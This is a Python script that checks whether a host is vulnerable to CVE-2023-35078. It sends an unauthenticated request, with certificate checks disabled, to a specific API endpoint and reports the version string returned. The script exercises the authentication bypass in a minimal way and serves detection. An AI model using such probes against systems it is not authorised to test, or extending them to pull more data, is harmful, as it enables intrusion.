#!/usr/bin/env python3

# Author: @synfinner
# Description: This script checks to see if a given IP/hostname is vulnerable to CVE-2023-35078
# Usage: python3 cve-2023-35078.py <IP/hostname>

import requests
import sys

#ignore ssl warnings
requests.packages.urllib3.disable_warnings()

# main function
def main():
    # set the api endpoint to the vulnerable endpoint
    url = "https://" + sys.argv[1] + "/mifs/aad/api/v2/ping"
    # try to send a request to the endpoint
    try:
        # send the request
        r = requests.get(url, verify=False)
        # check the response code
        if r.status_code == 200:
            try:
                data = r.json()
                if "vspVersion" in data['results']:
                    vsp_version = data["results"]["vspVersion"] 
                    # print the vulnerable message
                    print(f"[+] Vulnerable to CVE-2023-35078! VSP Version: {vsp_version}")
                else:
                    print("[+] Not vulnerable to CVE-2023-35078 or bad/unexpected response")
            except:
                # print the not vulnerable message
                print("[-] Not vulnerable to CVE-2023-35078")
        else:
            # print the not vulnerable message
            print("[-] Not vulnerable to CVE-2023-35078")
    # catch any exceptions
    except Exception as e:
        # print the error
        print(e)

# run the main function
if __name__ == "__main__":
    # check to see if the user provided an IP/hostname
    main()